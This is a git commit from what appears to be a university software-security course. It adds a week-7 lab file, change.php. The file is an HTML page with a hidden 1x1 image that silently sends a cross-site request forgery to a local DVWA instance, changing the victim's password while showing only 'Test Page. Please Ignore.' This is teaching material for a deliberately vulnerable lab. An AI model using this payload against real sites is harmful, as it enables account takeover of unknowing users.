949ca921a73cddafb8a88667bf815cbc0a421d16
Kevin Ma <kbma.kevin@gmail.com>
2018-10-17 16:41:38 -0400

    Added software-security workshop#1 and week7 slides

---
+++ software-security/wk7/change.php
@@ -0,0 +1,8 @@
+<html>
+<title>TEST</title>
+<body>
+<img
+src= "http://localhost/dvwa/vulnerabilities/csrf/?password_new=kashote&password_conf=kashote&Change=Change#" width="1" height="1" border="0">
+Test Page. Please Ignore.
+</body>
+</html>
